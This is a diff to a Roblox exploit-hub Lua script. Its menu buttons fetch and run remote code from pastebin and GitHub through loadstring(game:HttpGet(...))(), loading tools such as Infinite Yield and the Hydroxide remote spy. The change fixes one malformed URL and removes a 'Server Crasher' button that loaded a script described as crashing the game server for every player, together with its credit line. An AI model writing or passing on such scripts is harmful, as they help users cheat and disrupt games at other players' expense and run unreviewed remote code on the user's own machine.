@@ -11,7 +11,7 @@ MainSection:NewButton("Infinite Yield", "Basically Admin", function()
 end)
 
 MainSection:NewButton("Internal UI", "Internal UI (for solara)", function()
-	loadstring(game:HttpGet('loadstring(game:HttpGet("https://pastebin.com/raw/xsPhFys2"))()'))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/xsPhFys2'))()
 end)
 
 MainSection:NewButton("Spider Man (R15)", "Walk on Walls" , function()
@@ -41,10 +41,6 @@ end)
  
 MainSection:NewButton("Hydroxide", "Like RemoteSpy" , function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/SqfkEjyj"))()
-end)
-
-MainSection:NewButton("Server Crasher", "Completely crashes the server (crashes you and all players)" , function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Cr1tacl/Winter-s-Hub/main/servercrash.lua"))()
 end)
  
 local Player = Window:NewTab("Player")
@@ -200,7 +196,6 @@ local Tab = Window:NewTab("Credits")
 local Section = Tab:NewSection("Discord: ._.b0ne")
 local Section = Tab:NewSection("Youtube Channel: @51256")
 local Section = Tab:NewSection("I will add more soon dont worry")
-local Section = Tab:NewSection("Credit to johncrash for crash script")
  
 Section:NewKeybind("Keybind", "Open/Close Menu", Enum.KeyCode.V, function()
 	Library:ToggleUI(V)
